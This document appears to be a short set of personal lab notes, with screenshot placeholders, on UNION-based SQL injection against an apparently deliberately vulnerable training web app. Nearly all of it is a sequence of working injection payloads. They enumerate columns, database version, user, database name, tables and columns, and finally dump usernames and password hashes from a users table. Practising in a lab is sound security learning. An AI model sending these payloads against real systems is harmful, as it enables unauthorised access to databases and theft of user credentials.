Determine number of columns:

```bash
id=1+union+select+null,null#&Submit=Submit
```

![[Pasted image 20241103120936.png]]

Determine database version:

```bash
id=1+union+select+null,@@version#&Submit=Submit
```

![[Pasted image 20241103121125.png]]

Determine username:

```bash
id=1+union+select+null,(select+user())#&Submit=Submit
```

![[Pasted image 20241103121342.png]]

Determine database name:

```bash
id=1+union+select+null,(SELECT+database())#&Submit=Submit
```

![[Pasted image 20241103121454.png]]

Find all tables available within working database:

```bash
id=1+union+select+table_name+,+null+from+information_schema.tables#&Submit=Submit
```

![[Pasted image 20241103121801.png]]

View all table column names:

```bash
id=1+union+all+select+table_name,column_name+from+information_schema.columns#&Submit=Submit
```

![[Pasted image 20241103125019.png]]

View usernames and password:

```bash
id=1+UNION+SELECT+user,+password+FROM+users#&Submit=Submit
```

![[Pasted image 20241103125148.png]]
